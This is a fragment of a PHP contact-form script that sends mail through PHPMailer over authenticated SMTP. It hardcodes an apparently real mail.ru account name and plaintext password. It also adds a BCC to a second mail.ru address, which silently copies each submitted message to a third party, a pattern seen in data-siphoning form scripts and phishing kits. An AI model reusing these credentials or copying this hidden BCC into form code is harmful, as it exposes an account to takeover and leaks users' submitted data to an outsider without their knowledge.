...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	...
	if(defined('HOST') && HOST != '') {
		...
		$mail->SMTPAuth = true;
		$mail->Username = 'bossbogdan2003@mail.ru';
		$mail->Password = 'cykableat007';
		$mail->SMTPSecure = 'ssl';
		$mail->Port = 465;
		$mail->AddReplyTo('bossbogdan2003@mail.ru','Богдан Морозов');
	} else {
		$mail = new PHPMailer;
	}

	$mail->setFrom('bossbogdan2003@mail.ru','Богдан Морозов');
    $mail->addBCC('dasasxzxw1e12@mail.ru','Вася Петров');
